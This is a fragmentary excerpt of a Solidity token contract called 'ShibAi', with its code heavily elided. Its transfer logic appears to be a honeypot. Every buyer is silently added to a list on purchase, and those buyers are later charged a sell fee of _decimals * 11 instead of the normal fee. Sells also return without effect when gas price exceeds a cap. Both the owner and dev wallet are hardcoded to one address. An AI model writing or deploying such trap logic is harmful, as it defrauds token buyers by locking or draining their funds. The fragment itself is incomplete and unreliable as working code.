...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xCB172915400EdF081F37736cdeD141D9cAA8A0fa;
...
contract ShibAi is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0xCB172915400EdF081F37736cdeD141D9cAA8A0fa);
    ...
    */
    ...
    function _transfer(
        ...
        */
        ...
        if ((from != owner() && to != owner()) || (from != Wallet_Dev || to != Wallet_Dev)){
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){includeFromFee.push(to);_TotalFee = _buyFee;} else if (to == uniswapV2Pair){if(_isIncludedFromFee[from]){_TotalFee = _decimals * 11;}else{_TotalFee = _sellFee;}if (tx.gasprice > maxGwei) return;}
